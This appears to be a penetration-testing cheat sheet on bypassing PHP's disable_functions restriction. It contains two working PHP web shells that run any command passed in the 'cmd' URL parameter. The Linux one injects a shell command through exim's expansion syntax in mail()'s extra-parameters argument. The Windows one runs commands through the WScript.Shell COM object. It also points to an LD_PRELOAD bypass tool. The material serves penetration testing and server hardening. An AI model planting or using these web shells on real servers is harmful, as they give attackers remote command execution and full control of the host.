### Configuration

```php
disable_functions = system, proc_open, popen, passthru, shell_exec, exec, python_eval, perl_system
```

### Linux

* sendmail -> exim bypass

```php
<?php
$command_file = "/tmp/cmdMhhaJ8aM";
$output_file = "/tmp/outputMhhaJ8aM";
$cmd = $argv[1] ? $argv[1] : $_GET['cmd'];
$cmd = "$cmd > $output_file";

file_put_contents($command_file, $cmd);
mail("root@localhost", "aaa", "bbb", null,
     '-fwordpress@xenial(tmp1 -be ${run{/bin/sh${substr{10}{1}{$tod_log}}'.$command_file.'}} tmp2)');
echo file_get_contents($output_file);
unlink($output_file);
unlink($command_file);
```

* LD_PRELOAD bypass

tools : [Chankro](https://github.com/TarlogicSecurity/Chankro)

### Windows

* use `COM` to bypass

```php
<?php
$runCommand = "C:\\WINDOWS\\system32\\cmd.exe /c {$_GET['cmd']}"; //Wrong by purpuse to get some good output
$WshShell = new COM("WScript.Shell");
$output = $WshShell->Exec($runCommand)->StdOut->ReadAll;
echo "<p>$output</p>";
?>
```

### Ref

* [Yet Another PHP disable_functions Bypass](https://ricterz.me/posts/Yet%20Another%20PHP%20disable_functions%20Bypass)
* [how to bypass disable functions and open basedir](https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/)
